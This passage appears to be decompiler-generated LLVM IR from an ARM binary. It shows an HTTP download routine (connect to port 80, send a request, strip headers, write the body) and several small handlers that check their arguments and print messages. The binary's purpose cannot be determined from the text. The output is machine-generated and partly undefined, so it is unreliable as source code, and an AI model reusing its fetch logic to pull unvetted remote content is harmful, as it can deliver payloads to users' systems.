  %v2_8f58 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v1_8f50, i32* %r1.global-to-local, align 4
  %v2_8f64 = inttoptr i32 %v1_8f50 to i8*
  %v3_8f64 = call i32 @function_ed20(i32 %v2_8f58, i8* %v2_8f64)
  br label %dec_label_pc_8f98

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f04
  %v4_8f78 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f7c = add i32 %v4_8f78, 4
  %v1_8f80 = inttoptr i32 %v1_8f7c to i32*
  %v2_8f80 = load i32, i32* %v1_8f80, align 4
  %v2_8f88 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_8f80, i32* %r1.global-to-local, align 4
  %v2_8f94 = inttoptr i32 %v2_8f80 to i8*
  %v3_8f94 = call i32 @function_ed20(i32 %v2_8f88, i8* %v2_8f94)
  br label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f38, %dec_label_pc_8f6c
  %v2_8fb8.pre-phi = phi i32 [ %v2_8f58, %dec_label_pc_8f38 ], [ %v2_8f88, %dec_label_pc_8f6c ]
  br label %dec_label_pc_8fb0

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8fd0
  %v1_8fa8 = add i32 %storemerge5, 1
  br label %dec_label_pc_8fb0

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8fa4
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8f98 ], [ %v1_8fa8, %dec_label_pc_8fa4 ]
  store i32 %storemerge5, i32* @r4, align 4
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v0_8fc0 = call i32 @function_ecc0()
  %v0_8fc8 = load i32, i32* @r4, align 4
  %v3_8fc8 = icmp ult i32 %v0_8fc8, %v0_8fc0
  br i1 %v3_8fc8, label %dec_label_pc_8fd0, label %dec_label_pc_8ff4

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_8fe0 = add i32 %storemerge5, %v16_8df8
  %v2_8fe4 = add i32 %v2_8fe0, -1084
  %v1_8fe8 = inttoptr i32 %v2_8fe4 to i8*
  %v2_8fe8 = load i8, i8* %v1_8fe8, align 1
  %v7_8fec = icmp eq i8 %v2_8fe8, 47
  br i1 %v7_8fec, label %dec_label_pc_8ff4, label %dec_label_pc_8fa4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8fb0, %dec_label_pc_8fd0
  %v2_9004 = add i32 %v16_8df8, -1084
  %v2_9008 = add i32 %v2_9004, %storemerge5
  %v3_9010 = inttoptr i32 %v2_9008 to i8*
  store i8 0, i8* %v3_9010, align 1
  store i32 2, i32* %stack_var_-80, align 4
  %v1_9028 = call i32 @function_f294(i32 80)
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v1_9048 = call i32 @function_f3c0(i32 %v2_8fb8.pre-phi)
  %v3_9058 = icmp eq i32 %v1_9048, -1
  br i1 %v3_9058, label %dec_label_pc_9060, label %dec_label_pc_90e0

dec_label_pc_9060:                                ; preds = %dec_label_pc_8ff4
  %v1_906c = call i32 @function_f3e4(i32 %v2_8fb8.pre-phi)
  %v2_907c = icmp eq i32 %v1_906c, 0
  br i1 %v2_907c, label %dec_label_pc_9084, label %dec_label_pc_90b4

dec_label_pc_9084:                                ; preds = %dec_label_pc_9060
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_9098 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_14bf8.51 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_90a8 = call i32 @function_8374(i32 %v4_9098, i32 ptrtoint ([39 x i8]* @global_var_14bf8.51 to i32))
  %v1_90b0 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_90b4

dec_label_pc_90b4:                                ; preds = %dec_label_pc_9060, %dec_label_pc_9084
  %v2_90b8 = ptrtoint i32* %stack_var_-76 to i32
  %v1_90c0 = add i32 %v1_906c, 16
  %v2_90c0 = inttoptr i32 %v1_90c0 to i32*
  %v3_90c0 = load i32, i32* %v2_90c0, align 4
  %v1_90c4 = inttoptr i32 %v3_90c0 to i32*
  %v2_90c4 = load i32, i32* %v1_90c4, align 4
  store i32 %v2_90c4, i32* @r1, align 4
  %v1_90cc = add i32 %v1_906c, 12
  %v2_90cc = inttoptr i32 %v1_90cc to i32*
  %v3_90cc = load i32, i32* %v2_90cc, align 4
  store i32 %v2_90b8, i32* @r0, align 4
  store i32 %v3_90cc, i32* @r2, align 4
  %v0_90d8 = call i32 @function_ec10()
  br label %dec_label_pc_90e8

dec_label_pc_90e0:                                ; preds = %dec_label_pc_8ff4
  store i32 %v1_9048, i32* %stack_var_-76, align 4
  br label %dec_label_pc_90e8

dec_label_pc_90e8:                                ; preds = %dec_label_pc_90b4, %dec_label_pc_90e0
  %v2_90e8.pre-phi = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_90e8.pre-phi, i32* %r1.global-to-local, align 4
  %v3_9110 = bitcast i32* %stack_var_-80 to %sockaddr*
  %v4_9110 = call i32 @function_f7f4(i32 %v3_8ebc, %sockaddr* %v3_9110, i32 16)
  %v2_9118 = icmp eq i32 %v4_9110, 0
  br i1 %v2_9118, label %dec_label_pc_9150, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_90e8
  %v4_9134 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_14c20.53 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9144 = call i32 @function_8374(i32 %v4_9134, i32 ptrtoint ([39 x i8]* @global_var_14c20.53 to i32))
  %v1_914c = call i32 @function_10500(i32 0)
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_90e8, %dec_label_pc_9120
  %v2_9160 = add i32 %v2_8fb8.pre-phi, 1
  %v1_9164 = add i32 %v2_9160, %storemerge5
  store i32 %v1_9164, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_14c48.55 to i32), i32* %r1.global-to-local, align 4
  %v3_9178 = call i32 @function_8374(i32 %v3_8ebc, i32 ptrtoint ([276 x i8]* @global_var_14c48.55 to i32))
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_9190 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([28 x i8]* @global_var_14d5c.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91a0 = call i32 @function_8374(i32 %v4_9190, i32 ptrtoint ([28 x i8]* @global_var_14d5c.57 to i32))
  %v4_91b0 = load i32, i32* %stack_var_-5216, align 4
  %v1_91b4 = add i32 %v4_91b0, 8
  %v1_91b8 = inttoptr i32 %v1_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14d78.59 to i32), i32* @r1, align 4
  %v3_91c4 = call i32 @function_cd94(i32 %v2_91b8, i32 ptrtoint ([3 x i8]* @global_var_14d78.59 to i32))
  %v2_91d8 = ptrtoint i32* %stack_var_-5200 to i32
  %v2_9228 = add i32 %v16_8df8, -5180
  br label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %dec_label_pc_9364, %dec_label_pc_9150
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_91ec = call i32 @function_f84c(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp56 = icmp slt i32 %v5_91ec, 1
  br i1 %tmp56, label %dec_label_pc_9384.loopexit9, label %dec_label_pc_9204

dec_label_pc_9204:                                ; preds = %dec_label_pc_91d0
  %v8_9214 = icmp sgt i32 %v5_91ec, 4095
  br i1 %v8_9214, label %dec_label_pc_9244.lr.ph, label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %dec_label_pc_9204
  %v2_922c = add i32 %v5_91ec, %v2_9228
  %v3_9234 = inttoptr i32 %v2_922c to i8*
  store i8 0, i8* %v3_9234, align 1
  br label %dec_label_pc_9244.lr.ph

dec_label_pc_9244.lr.ph:                          ; preds = %dec_label_pc_9218, %dec_label_pc_9204
  br label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_9244.lr.ph, %dec_label_pc_9364
  %storemerge691 = phi i32 [ 0, %dec_label_pc_9244.lr.ph ], [ %v1_9368, %dec_label_pc_9364 ]
  %v2_9258 = add i32 %storemerge691, %v2_91d8
  store i32 ptrtoint ([5 x i8]* @global_var_14d7c.61 to i32), i32* @r1, align 4
  %v4_9268 = inttoptr i32 %v2_9258 to i8*
  %v5_9268 = call i32 @function_ed3c(i8* %v4_9268, i32 ptrtoint ([5 x i8]* @global_var_14d7c.61 to i32), i32 4)
  %v2_9270 = icmp eq i32 %v5_9268, 0
  br i1 %v2_9270, label %dec_label_pc_9278, label %dec_label_pc_9364

dec_label_pc_9278:                                ; preds = %dec_label_pc_9244
  %v1_927c = add i32 %storemerge691, 4
  %v1_9294 = add i32 %v3_91c4, 52
  %v2_9294 = inttoptr i32 %v1_9294 to i32*
  %v1_92a4 = add i32 %v3_91c4, 16
  %v2_92a4 = inttoptr i32 %v1_92a4 to i32*
  %v1_92ac = add i32 %v3_91c4, 28
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v5_935c80 = icmp slt i32 %v1_927c, %v5_91ec
  br i1 %v5_935c80, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9288:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344
  %storemerge781 = phi i32 [ %v1_9348, %dec_label_pc_9344 ], [ %v1_927c, %dec_label_pc_9278 ]
  %v3_9294 = load i32, i32* %v2_9294, align 4
  %v2_9298 = icmp eq i32 %v3_9294, 0
  br i1 %v2_9298, label %dec_label_pc_931c, label %dec_label_pc_92a0

dec_label_pc_92a0:                                ; preds = %dec_label_pc_9288
  %v3_92a4 = load i32, i32* %v2_92a4, align 4
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v3_92b0 = icmp ult i32 %v3_92a4, %v3_92ac
  br i1 %v3_92b0, label %dec_label_pc_92b8, label %dec_label_pc_92f0

dec_label_pc_92b8:                                ; preds = %dec_label_pc_92a0
  %v3_92bc = load i32, i32* %v2_92a4, align 4
  store i32 %v3_92bc, i32* %r1.global-to-local, align 4
  %v2_92d0 = add i32 %storemerge781, %v16_8df8
  %v2_92d4 = add i32 %v2_92d0, -5180
  %v1_92d8 = inttoptr i32 %v2_92d4 to i8*
  %v2_92d8 = load i8, i8* %v1_92d8, align 1
  %v3_92dc = inttoptr i32 %v3_92bc to i8*
  store i8 %v2_92d8, i8* %v3_92dc, align 1
  %v0_92e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_92e0 = add i32 %v0_92e0, 1
  store i32 %v1_92e0, i32* %v2_92a4, align 4
  br label %dec_label_pc_9344

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92a0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_9300 = add i32 %storemerge781, %v16_8df8
  %v2_9304 = add i32 %v2_9300, -5180
  %v1_9308 = inttoptr i32 %v2_9304 to i8*
  %v2_9308 = load i8, i8* %v1_9308, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9314 = call i32 @function_ea1c(i8 %v2_9308, i32 %v3_91c4, i32 %v2_9300)
  br label %dec_label_pc_9344

dec_label_pc_931c:                                ; preds = %dec_label_pc_9288
  %v2_932c = add i32 %storemerge781, %v16_8df8
  %v2_9330 = add i32 %v2_932c, -5180
  %v1_9334 = inttoptr i32 %v2_9330 to i8*
  %v2_9334 = load i8, i8* %v1_9334, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9340 = call i32 @function_e594(i8 %v2_9334, i32 %v3_91c4, i32 %v2_932c)
  br label %dec_label_pc_9344

dec_label_pc_9344:                                ; preds = %dec_label_pc_92f0, %dec_label_pc_92b8, %dec_label_pc_931c
  %v1_9348 = add i32 %storemerge781, 1
  %v5_935c = icmp slt i32 %v1_9348, %v5_91ec
  br i1 %v5_935c, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9364:                                ; preds = %dec_label_pc_9244
  %v1_9368 = add nuw nsw i32 %storemerge691, 1
  %v5_937c = icmp slt i32 %v1_9368, %v5_91ec
  br i1 %v5_937c, label %dec_label_pc_9244, label %dec_label_pc_91d0

dec_label_pc_9384.loopexit9:                      ; preds = %dec_label_pc_91d0
  %.pre17 = add i32 %v3_91c4, 52
  %.pre18 = inttoptr i32 %.pre17 to i32*
  %.pre19 = add i32 %v3_91c4, 16
  %.pre20 = inttoptr i32 %.pre19 to i32*
  %.pre21 = add i32 %v3_91c4, 28
  %.pre22 = inttoptr i32 %.pre21 to i32*
  br label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344, %dec_label_pc_9384.loopexit9
  %v2_9460.pre-phi = phi i32* [ %.pre22, %dec_label_pc_9384.loopexit9 ], [ %v2_92ac, %dec_label_pc_9344 ], [ %v2_92ac, %dec_label_pc_9278 ]
  %v2_9458.pre-phi = phi i32* [ %.pre20, %dec_label_pc_9384.loopexit9 ], [ %v2_92a4, %dec_label_pc_9344 ], [ %v2_92a4, %dec_label_pc_9278 ]
  %v2_9448.pre-phi = phi i32* [ %.pre18, %dec_label_pc_9384.loopexit9 ], [ %v2_9294, %dec_label_pc_9344 ], [ %v2_9294, %dec_label_pc_9278 ]
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_93b0 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_14d84.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_93c4 = call i32 @function_8374(i32 %v4_93b0, i32 ptrtoint ([24 x i8]* @global_var_14d84.63 to i32))
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9384
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_93e4 = call i32 @function_f84c(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v5_93e4, 1
  br i1 %tmp58, label %dec_label_pc_9518, label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93c8
  %v8_940c = icmp sgt i32 %v5_93e4, 4095
  br i1 %v8_940c, label %dec_label_pc_943c.lr.ph, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_93fc
  store i32 %v16_8df8, i32* @ip, align 4
  %v2_9424 = add i32 %v5_93e4, %v2_9228
  %v3_942c = inttoptr i32 %v2_9424 to i8*
  store i8 0, i8* %v3_942c, align 1
  br label %dec_label_pc_943c.lr.ph

dec_label_pc_943c.lr.ph:                          ; preds = %dec_label_pc_9410, %dec_label_pc_93fc
  br label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_943c.lr.ph, %dec_label_pc_94f8
  %storemerge871 = phi i32 [ 0, %dec_label_pc_943c.lr.ph ], [ %v1_94fc, %dec_label_pc_94f8 ]
  %v3_9448 = load i32, i32* %v2_9448.pre-phi, align 4
  %v2_944c = icmp eq i32 %v3_9448, 0
  br i1 %v2_944c, label %dec_label_pc_94d0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_943c
  %v3_9458 = load i32, i32* %v2_9458.pre-phi, align 4
  %v3_9460 = load i32, i32* %v2_9460.pre-phi, align 4
  %v3_9464 = icmp ult i32 %v3_9458, %v3_9460
  br i1 %v3_9464, label %dec_label_pc_946c, label %dec_label_pc_94a4

dec_label_pc_946c:                                ; preds = %dec_label_pc_9454
  %v3_9470 = load i32, i32* %v2_9458.pre-phi, align 4
  store i32 %v3_9470, i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  %v2_9484 = add i32 %storemerge871, %v16_8df8
  %v2_9488 = add i32 %v2_9484, -5180
  %v1_948c = inttoptr i32 %v2_9488 to i8*
  %v2_948c = load i8, i8* %v1_948c, align 1
  %v3_9490 = inttoptr i32 %v3_9470 to i8*
  store i8 %v2_948c, i8* %v3_9490, align 1
  %v0_9494 = load i32, i32* %r1.global-to-local, align 4
  %v1_9494 = add i32 %v0_9494, 1
  store i32 %v1_9494, i32* %v2_9458.pre-phi, align 4
  br label %dec_label_pc_94f8

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9454
  %v2_94b4 = add i32 %storemerge871, %v16_8df8
  %v2_94b8 = add i32 %v2_94b4, -5180
  %v1_94bc = inttoptr i32 %v2_94b8 to i8*
  %v2_94bc = load i8, i8* %v1_94bc, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94c8 = call i32 @function_ea1c(i8 %v2_94bc, i32 %v3_91c4, i32 %v2_94b4)
  br label %dec_label_pc_94f8

dec_label_pc_94d0:                                ; preds = %dec_label_pc_943c
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_94e0 = add i32 %storemerge871, %v16_8df8
  %v2_94e4 = add i32 %v2_94e0, -5180
  %v1_94e8 = inttoptr i32 %v2_94e4 to i8*
  %v2_94e8 = load i8, i8* %v1_94e8, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94f4 = call i32 @function_e594(i8 %v2_94e8, i32 %v3_91c4, i32 %v2_94e0)
  br label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94a4, %dec_label_pc_946c, %dec_label_pc_94d0
  %v1_94fc = add nuw nsw i32 %storemerge871, 1
  %v5_9510 = icmp slt i32 %v1_94fc, %v5_93e4
  br i1 %v5_9510, label %dec_label_pc_943c, label %dec_label_pc_93c8

dec_label_pc_9518:                                ; preds = %dec_label_pc_93c8
  %v1_951c = inttoptr i32 %v3_91c4 to i8*
  %v2_951c = call i32 @function_cc14(i8* %v1_951c)
  %v1_9524 = call i32 @function_ca18(i32 %v3_8ebc)
  %v1_952c = call i32 @function_10500(i32 0)
  br label %dec_label_pc_9530

dec_label_pc_9530:                                ; preds = %dec_label_pc_8df4, %dec_label_pc_9518
  %v12_9534 = phi i32 [ %v1_8e58, %dec_label_pc_8df4 ], [ %v1_952c, %dec_label_pc_9518 ]
  ret i32 %v12_9534

; uselistorder directives
  uselistorder i32 %storemerge871, { 0, 3, 2, 1 }
  uselistorder i32 %v5_93e4, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9458.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_9348, { 1, 0 }
  uselistorder i32 %storemerge781, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge691, { 1, 0, 2 }
  uselistorder i32 %v5_91ec, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_91d8, { 1, 0, 2 }
  uselistorder i32 %v3_91c4, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8fb8.pre-phi, { 0, 4, 2, 3, 1 }
  uselistorder i32* %v4_8e14, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %v16_8df8, { 0, 15, 1, 2, 14, 13, 16, 17, 3, 4, 12, 5, 7, 18, 11, 19, 8, 6, 10, 20, 21, 9, 22, 23, 24 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 28, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 -5180, { 4, 5, 6, 1, 2, 3, 0 }
  uselistorder i32 -1084, { 0, 2, 3, 4, 1 }
  uselistorder i32 (i8*, i32, i32)* @function_ed3c, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_9530, { 1, 0 }
  uselistorder label %dec_label_pc_94f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_943c, { 1, 0 }
  uselistorder label %dec_label_pc_9384, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9288, { 1, 0 }
  uselistorder label %dec_label_pc_9244, { 1, 0 }
  uselistorder label %dec_label_pc_9150, { 1, 0 }
  uselistorder label %dec_label_pc_90e8, { 1, 0 }
  uselistorder label %dec_label_pc_90b4, { 1, 0 }
  uselistorder label %dec_label_pc_8ff4, { 1, 0 }
  uselistorder label %dec_label_pc_8fb0, { 1, 0 }
  uselistorder label %dec_label_pc_8f98, { 1, 0 }
  uselistorder label %dec_label_pc_8f04, { 1, 0 }
  uselistorder label %dec_label_pc_8eb0, { 1, 0 }
}

define i32 @function_9560(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9560:
  %tmp25 = call i8 @__decompiler_undefined_function_2()
  %tmp26 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  store i32 38252, i32* %stack_var_-4, align 4
  %v2_9568 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9568, i32* @fp, align 4
  %v2_9590 = load i32, i32* @global_var_1f4f4.35, align 4
  %v7_95b0 = icmp eq i32 %v2_9590, 1
  br i1 %v7_95b0, label %dec_label_pc_95b8, label %dec_label_pc_9614

dec_label_pc_95b8:                                ; preds = %dec_label_pc_9560
  store i32 %arg2, i32* @r2, align 4
  %v3_960c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_14d9c.67 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_9614:                                ; preds = %dec_label_pc_9560
  %v2_9584 = load i8*, i8** @global_var_1f4f0.33, align 4
  %v3_9584 = ptrtoint i8* %v2_9584 to i32
  store i32 %v3_9584, i32* @lr, align 4
  %v3_9658 = sext i8 %tmp26 to i32
  store i32 %v3_9658, i32* @r4, align 4
  %v3_9668 = sext i8 %tmp25 to i32
  store i32 %v3_9668, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96b4 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_14dbc.69 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_95b8, %dec_label_pc_9614
  %storemerge = phi i32 [ %v3_96b4, %dec_label_pc_9614 ], [ %v3_960c, %dec_label_pc_95b8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @function_96d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96d0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38620, i32* %stack_var_-4, align 4
  %v2_96d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_96d8, i32* @fp, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_14dec.71 to i32))
  ret i32 %v3_96fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_970c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_970c:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38680, i32* %stack_var_-4, align 4
  %v2_9714 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9714, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_9730 = icmp eq i32 %arg3, 1
  br i1 %v7_9730, label %dec_label_pc_974c, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  store i32 %arg2, i32* @r2, align 4
  %v3_9744 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_14e0c.73 to i32))
  br label %dec_label_pc_979c

dec_label_pc_974c:                                ; preds = %dec_label_pc_970c
  %v1_9750 = add i32 %arg4, 4
  %v1_9754 = inttoptr i32 %v1_9750 to i32*
  %v2_9754 = load i32, i32* %v1_9754, align 4
  store i32 %v2_9754, i32* @r0, align 4
  %v0_975c = call i32 @function_ecc0()
  %tmp = icmp ult i32 %v0_975c, 10
  br i1 %tmp, label %dec_label_pc_9780, label %dec_label_pc_976c

dec_label_pc_976c:                                ; preds = %dec_label_pc_974c
  store i32 %arg2, i32* @r2, align 4
  %v3_9778 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_14e24.75 to i32))
  br label %dec_label_pc_979c

dec_label_pc_9780:                                ; preds = %dec_label_pc_974c
  %v3_9780 = load i32, i32* %stack_var_-32, align 4
  %v1_9784 = add i32 %v3_9780, 4
  %v1_9788 = inttoptr i32 %v1_9784 to i32*
  %v2_9788 = load i32, i32* %v1_9788, align 4
  store i32 %v2_9788, i32* @r2, align 4
  %v3_9798 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_14e5c.77 to i32))
  br label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_976c, %dec_label_pc_9738, %dec_label_pc_9780
  %v9_97a0 = phi i32 [ %v3_9778, %dec_label_pc_976c ], [ %v3_9744, %dec_label_pc_9738 ], [ %v3_9798, %dec_label_pc_9780 ]
  ret i32 %v9_97a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_979c, { 2, 0, 1 }
}

define i32 @function_97b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_97b0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38844, i32* %stack_var_-4, align 4
  %v2_97b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97b8, i32* @fp, align 4
  %v7_97d4 = icmp eq i32 %arg3, 1
  br i1 %v7_97d4, label %dec_label_pc_9828, label %dec_label_pc_97dc

dec_label_pc_97dc:                                ; preds = %dec_label_pc_97b0
  store i32 %arg2, i32* @r2, align 4
  %v3_97e8 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_14e68.79 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9820 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_14eac.86 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9828:                                ; preds = %dec_label_pc_97b0
  %v2_982c = load i8, i8* bitcast (i8** @global_var_1f4ec.23 to i8*), align 4
  %v2_9830 = icmp eq i8 %v2_982c, 0
  br i1 %v2_9830, label %dec_label_pc_984c, label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9828
  store i32 %arg2, i32* @r2, align 4
  %v3_9844 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_14ed0.88 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_984c:                                ; preds = %dec_label_pc_9828
  %v1_9850 = add i32 %arg4, 4
  %v1_9854 = inttoptr i32 %v1_9850 to i32*
  %v2_9854 = load i32, i32* %v1_9854, align 4
  store i32 %v2_9854, i32* @r0, align 4
  %v0_985c = call i32 @function_ecc0()
  %tmp = icmp ult i32 %v0_985c, 255
  br i1 %tmp, label %dec_label_pc_9880, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_984c
  store i32 %arg2, i32* @r2, align 4
  %v3_9878 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_14ef0.90 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9880:                                ; preds = %dec_label_pc_984c
  store i8 1, i8* bitcast (i8** @global_var_1f4ec.23 to i8*), align 4
  store i32 256, i32* @r2, align 4
  %v3_989c = call i32 @function_ec20(i8* bitcast (i32* @global_var_21b68.92 to i8*), i32 0)
  %v2_98a8 = load i32, i32* %v1_9854, align 4
  %v2_98b4 = inttoptr i32 %v2_98a8 to i8*
  %v3_98b4 = call i32 @function_ed20(i32 ptrtoint (i32* @global_var_21b68.92 to i32), i8* %v2_98b4)
  %v3_98c0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_14f18.94 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_986c, %dec_label_pc_9838, %dec_label_pc_97dc, %dec_label_pc_9880
  %v9_98c8 = phi i32 [ %v3_9878, %dec_label_pc_986c ], [ %v3_9844, %dec_label_pc_9838 ], [ %v3_9820, %dec_label_pc_97dc ], [ %v3_98c0, %dec_label_pc_9880 ]
  ret i32 %v9_98c8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_98c4, { 3, 0, 1, 2 }
}

define i32 @function_98f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_98f0:
